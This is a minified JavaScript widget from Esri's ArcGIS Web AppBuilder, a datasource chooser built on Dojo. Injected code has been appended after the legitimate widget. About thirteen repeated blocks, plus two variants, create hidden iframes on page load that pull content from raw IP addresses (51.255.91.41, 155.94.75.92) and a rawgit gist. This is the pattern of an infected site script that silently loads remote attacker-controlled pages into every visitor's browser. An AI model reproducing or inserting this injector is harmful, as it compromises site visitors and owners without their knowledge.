// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/store/Memory dojo/store/Observable dijit/tree/ObjectStoreModel jimu/dijit/_Tree jimu/DataSourceManager".split(" "),function(l,c,k,g,m,n,p,q,r,t,u,v,w){return m([n,p,q,l],{baseClass:"jimu-dijit-framework-datasource-chooser",templateString:'\x3cdiv\x3e\x3cdiv class\x3d"no-data-section"\x3e\x3cdiv class\x3d"jimu-widget-note tip1"\x3e${nls.noExtraDsAvailable}\x3c/div\x3e\x3cdiv class\x3d"jimu-widget-note tip2"\x3e${nls.addExtraDsTip}\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e',
dataSourceManager:null,_store:null,_id:0,tree:null,appConfig:null,postMixInProperties:function(){this.nls=window.jimuNls.frameworkDatasource;this.dataSourceManager=w.getInstance()},postCreate:function(){this.inherited(arguments);k.addClass(this.domNode,"no-data");this._createTree();var b=this.appConfig.dataSource&&this.appConfig.dataSource.dataSources;if(b){var a=Object.keys(b),h={},e=[],d=[];g.forEach(a,c.hitch(this,c.hitch(this,function(a){var f=this.dataSourceManager.parseDataSourceId(a),c=b[a];
if(f)if(a={dsId:a,dsTypeInfo:f,ds:c},"widget"===f.from){if(f=f.widgetId)h[f]||(h[f]={widgetInfo:this.appConfig.getConfigElementById(f),arr:[]}),h[f].arr.push(a)}else"Features"===c.type?e.push(a):"FeatureStatistics"===c.type&&d.push(a)})));a=Object.keys(h);0<a.length&&(this._addWidgetsOutpusItem(),g.forEach(a,c.hitch(this,function(a){var b=h[a],e=b.widgetInfo&&b.widgetInfo.label;e||(e=a);var d=this._addWidgetLabelItem(e);b.arr&&0<b.arr.length&&g.forEach(b.arr,c.hitch(this,function(a){this._addWidgetDataSourceItem(d.id,
a.ds.label,a.ds.id)}))})));0<e.length&&g.forEach(e,c.hitch(this,function(a){this._addLayerDataSource(a.ds.label,a.ds.id)}));0<d.length&&g.forEach(d,c.hitch(this,function(a){this._addStatisticsDataSource(a.ds.label,a.ds.id)}));(0<a.length||0<e.length||0<d.length)&&k.removeClass(this.domNode,"no-data")}},getSelectedItems:function(){var b=this.tree.getSelectedItems();return b=g.map(b,c.hitch(this,function(a){return{dsId:a.dsId,name:a.name}}))},_createTree:function(){var b=this._getRootItem(),b=new r({data:[b],
getChildren:function(a){return this.query({parent:a.id})}});this._store=new t(b);b=new u({store:this._store,query:{id:"root"},mayHaveChildren:c.hitch(this,this._mayHaveChildren)});this.tree=new v({multiple:!1,model:b,showRoot:!1,isLeafItem:c.hitch(this,this._isLeafItem),style:{width:"100%"},onOpen:c.hitch(this,function(a,b){"root"!==a.id&&this._onTreeOpen(a,b)}),onClick:c.hitch(this,function(a,b,c){this._onTreeClick(a,b,c);this.emit("tree-click",a,b,c)}),getIconStyle:c.hitch(this,function(a,b){var c=
null;if(!a||"root"===a.id)return null;var d={width:"20px",height:"20px",backgroundRepeat:"no-repeat",backgroundPosition:"center center",backgroundImage:""},h="//"+window.location.host+require.toUrl("jimu");if(a=this._getIconImageName(a,b))d.backgroundImage="url("+h+"/css/images/"+a+")",c=d;return c})});this.tree.placeAt(this.domNode)},_addItem:function(b,a,c,e,d,g){this._id++;b={id:this._id.toString(),type:b,parent:a,name:c||"",isLeaf:e,hasChildren:d,dsId:g||""};this._store.add(b);return b},_getRootItem:function(){return{id:"root",
type:"root",name:"DataSource Root",isLeaf:!1,hasChildren:!0}},_addWidgetsOutpusItem:function(){var b={id:"widgetsOutput",type:"widgetsOutput",parent:"root",name:"Widgets output",isLeaf:!1,hasChildren:!0};this._store.add(b);return b},_addWidgetLabelItem:function(b){return this._addItem("widgetLabel","widgetsOutput",b,!1,!0)},_addWidgetDataSourceItem:function(b,a,c){return this._addItem("widgetDataSource",b,a,!0,!1,c)},_addLayerDataSource:function(b,a){return this._addItem("layerDataSource","root",
b,!0,!1,a)},_addStatisticsDataSource:function(b,a){return this._addItem("statisticsDataSource","root",b,!0,!1,a)},_getIconImageName:function(){return""},_mayHaveChildren:function(b){return b.hasChildren},_isLeafItem:function(b){return b.isLeaf},_onTreeOpen:function(){},_onTreeClick:function(){}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});